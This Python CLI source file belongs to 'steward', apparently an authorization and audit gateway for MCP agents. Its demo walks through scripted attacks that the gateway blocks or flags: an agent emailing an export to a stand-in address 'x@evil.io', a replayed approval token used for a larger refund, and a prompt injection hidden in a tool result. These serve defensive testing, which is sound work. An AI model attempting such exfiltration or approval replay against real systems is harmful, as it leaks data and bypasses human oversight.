"""Command-line interface.

Built on argparse rather than a CLI framework so the package stays installable
with no dependency beyond what the service already needs.

    python -m steward demo             end-to-end walkthrough, no setup
    python -m steward eval             run the authorization evaluation
    python -m steward detector train   train and report the behavioural detector
    python -m steward corpus           inspect or export the scenario corpus
    python -m steward audit verify     recompute the audit hash chain
    python -m steward serve            run the API
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
from typing import Any

DEFAULT_REPORT_DIR = "reports/latest"


# ---------------------------------------------------------------------------
# demo
# ---------------------------------------------------------------------------


async def _demo(args: argparse.Namespace) -> int:
    from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

    from . import approvals, audit
    from .db import Base
    from .evals.baselines import least_privilege_policies
    from .evals.runner import _policy_from_spec
    from .mcp.gateway import Principal, StewardGateway
    from .mcp.registry import UpstreamRegistry, catalogue, discover, pin_tool

    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as connection:
        await connection.run_sync(Base.metadata.create_all)
    factory = async_sessionmaker(engine, expire_on_commit=False)
    registry = UpstreamRegistry.with_mock_fleet()

    print("== 1. Discover tools from five MCP servers ==")
    async with factory() as session:
        report = await discover(session, registry)
        for change in report.changes:
            marker = "!!" if change.kind == "quarantined" else "  "
            print(f" {marker} {change.kind:12s} {change.server}:{change.tool:16s} {change.detail[:56]}")

        for descriptor in await catalogue(session):
            if not descriptor.quarantined:
                await pin_tool(session, descriptor.server, descriptor.name, approved_by="demo")

        for spec in least_privilege_policies():
            session.add(_policy_from_spec(spec))
        await session.commit()

    gateway = StewardGateway(registry, factory)

    print("\n== 2. What each agent can see (scope-filtered tools/list) ==")
    for subject in ("agent-support", "agent-finance"):
        result = await gateway.list_tools(Principal(subject=subject))
        names = [tool["name"] for tool in result["tools"]]
        print(f"  {subject}: {len(names)} tools -> {', '.join(names)}")

    print("\n== 3. Calls ==")
    support = Principal(subject="agent-support", session_id="demo")
    finance = Principal(subject="agent-finance", session_id="demo")

    async def show(principal: Principal, name: str, arguments: dict, **kwargs: Any) -> Any:
        result = await gateway.call_tool(principal, name=name, arguments=arguments, **kwargs)
        if result.get("resultType") == "input_required":
            print(f"  {principal.subject:14s} {name:24s} -> HELD for approval")
            return result
        text = result["content"][0]["text"] if result.get("content") else ""
        status = "REFUSED" if result.get("isError") else "ok"
        print(f"  {principal.subject:14s} {name:24s} -> {status:8s} {text[:72]}")
        return result

    await show(support, "crm__contacts.read", {"contact_id": "1"})
    await show(support, "crm__contacts.delete", {"contact_id": "1"})
    await show(support, "comms__email.send", {"to": "x@evil.io", "body": "export"})
    await show(support, "partner__weather.lookup", {"city": "London"})
    held = await show(finance, "billing__refund.issue", {"invoice_id": "INV-1", "amount": 120})

    print("\n== 4. Human approves, agent retries ==")
    token = held.get("requestState")
    if token:
        async with factory() as session:
            await approvals.resolve(session, token, approved=True, decided_by="ops@example.com")
        await show(
            finance,
            "billing__refund.issue",
            {"invoice_id": "INV-1", "amount": 120},
            input_responses={
                "steward_approval": {"action": "accept", "content": {"approval_token": token}}
            },
        )
        print("  replaying that same token for a LARGER refund:")
        await show(
            finance,
            "billing__refund.issue",
            {"invoice_id": "INV-1", "amount": 480},
            input_responses={
                "steward_approval": {"action": "accept", "content": {"approval_token": token}}
            },
        )

    print("\n== 5. Indirect prompt injection through a tool result ==")
    result = await gateway.call_tool(
        finance, name="files__docs.read", arguments={"path": "ticket-4417.txt"}
    )
    findings = (result.get("_meta") or {}).get("steward/injectionFindings")
    print(f"  injection signals detected: {findings}")
    print(f"  result delimited as: {result['content'][0]['text'][:64]}...")

    print("\n== 6. Audit trail ==")
    async with factory() as session:
        verification = await audit.verify_chain(session)
        print(f"  {verification.events_checked} events, chain intact: {verification.intact}")
        checkpoint = await audit.checkpoint(session)
        print(f"  head hash: {checkpoint['head_hash'][:32]}...")

    await registry.close()
    await engine.dispose()
    return 0


# ---------------------------------------------------------------------------
# eval / detector / corpus
# ---------------------------------------------------------------------------


async def _eval(args: argparse.Namespace) -> int:
    from .evals import (
        ClaudeJudge,
        RubricJudge,
        RunConfig,
        build_conditions,
        load_corpus,
        run_evaluation,
        to_markdown,
        write_reports,
    )

    scenarios = load_corpus(args.corpus)
    conditions = build_conditions()
    if args.conditions:
        wanted = set(args.conditions)
        conditions = [item for item in conditions if item.name in wanted]

    agent_factory = None
    judge: Any = RubricJudge()

    if args.live:
        from .agent import load_claude_agent

        key = os.environ.get("ANTHROPIC_API_KEY")
        agent_factory = lambda: load_claude_agent(model=args.model)  # noqa: E731
        judge = ClaudeJudge(model=args.judge_model, api_key=key)
        print(f"Live mode: agent={args.model} judge={args.judge_model}", file=sys.stderr)

    completed = 0
    total = len(scenarios) * len(conditions)

    def progress(condition: str, scenario_id: str, _outcome: Any) -> None:
        nonlocal completed
        completed += 1
        print(f"\r  [{completed}/{total}] {condition} :: {scenario_id[:44]:44s}", end="", file=sys.stderr)

    result = await run_evaluation(
        scenarios=scenarios,
        conditions=conditions,
        config=RunConfig(
            seed=args.seed,
            susceptibility=args.susceptibility,
            bootstrap_resamples=args.resamples,
            judge=judge,
            agent_factory=agent_factory,
        ),
        progress=progress if not args.quiet else None,
    )
    print("", file=sys.stderr)

    paths = write_reports(result, args.out)
    print(to_markdown(result))
    print(f"\nWrote {paths['markdown']} and {paths['json']}", file=sys.stderr)
    return 0


def _detector(args: argparse.Namespace) -> int:
    from .detector import to_markdown, train, write_report

    detector = train(seed=args.seed, target_precision=args.target_precision)
    print(to_markdown(detector))
    paths = write_report(detector, args.out)
    print(f"\nWrote {paths['markdown']}", file=sys.stderr)
    return 0


def _corpus(args: argparse.Namespace) -> int:
    from .evals.corpus import build_corpus, corpus_stats, write_jsonl

    scenarios = build_corpus()
    if args.out:
        path = write_jsonl(scenarios, args.out)
        print(f"Wrote {len(scenarios)} scenarios to {path}", file=sys.stderr)
    print(json.dumps(corpus_stats(scenarios), indent=2))
    return 0


# ---------------------------------------------------------------------------
# audit
# ---------------------------------------------------------------------------


async def _audit_verify(args: argparse.Namespace) -> int:
    from . import audit
    from .db import SessionLocal

    async with SessionLocal() as session:
        report = await audit.verify_chain(session)

    print(json.dumps(report.to_dict(), indent=2))
    if not report.intact:
        print(
            f"\nCHAIN BROKEN: {len(report.breaks)} inconsistencies found.",
            file=sys.stderr,
        )
        return 1
    return 0


def _serve(args: argparse.Namespace) -> int:
    import uvicorn

    uvicorn.run(
        "steward.main:app", host=args.host, port=args.port, reload=args.reload
    )
    return 0


# ---------------------------------------------------------------------------
# entry point
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="steward",
        description="Per-action authorization and audit for MCP agents.",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("demo", help="end-to-end walkthrough against in-process servers")

    evaluate = sub.add_parser("eval", help="run the authorization evaluation")
    evaluate.add_argument("--corpus", default=None, help="path to a scenarios.jsonl")
    evaluate.add_argument("--out", default=DEFAULT_REPORT_DIR)
    evaluate.add_argument("--seed", type=int, default=0)
    evaluate.add_argument("--susceptibility", type=float, default=1.0)
    evaluate.add_argument("--resamples", type=int, default=2000)
    evaluate.add_argument("--conditions", nargs="*", default=None)
    evaluate.add_argument("--quiet", action="store_true")
    evaluate.add_argument(
        "--live",
        action="store_true",
        help="drive a real Claude agent and judge instead of the deterministic harness",
    )
    evaluate.add_argument("--model", default="claude-opus-5")
    evaluate.add_argument("--judge-model", default="claude-opus-5")

    detector = sub.add_parser("detector", help="behavioural anomaly detector")
    detector_sub = detector.add_subparsers(dest="detector_command", required=True)
    detector_train = detector_sub.add_parser("train", help="train and report")
    detector_train.add_argument("--seed", type=int, default=0)
    detector_train.add_argument("--target-precision", type=float, default=0.9)
    detector_train.add_argument("--out", default=DEFAULT_REPORT_DIR)

    corpus = sub.add_parser("corpus", help="inspect or export the scenario corpus")
    corpus.add_argument("--out", default=None, help="write scenarios.jsonl here")

    audit_parser = sub.add_parser("audit", help="audit-log operations")
    audit_sub = audit_parser.add_subparsers(dest="audit_command", required=True)
    audit_sub.add_parser("verify", help="recompute and verify the hash chain")

    serve = sub.add_parser("serve", help="run the HTTP API")
    serve.add_argument("--host", default="127.0.0.1")
    serve.add_argument("--port", type=int, default=8000)
    serve.add_argument("--reload", action="store_true")

    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    if args.command == "demo":
        return asyncio.run(_demo(args))
    if args.command == "eval":
        return asyncio.run(_eval(args))
    if args.command == "detector":
        return _detector(args)
    if args.command == "corpus":
        return _corpus(args)
    if args.command == "audit":
        return asyncio.run(_audit_verify(args))
    if args.command == "serve":
        return _serve(args)

    return 1  # pragma: no cover - argparse enforces the choices


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
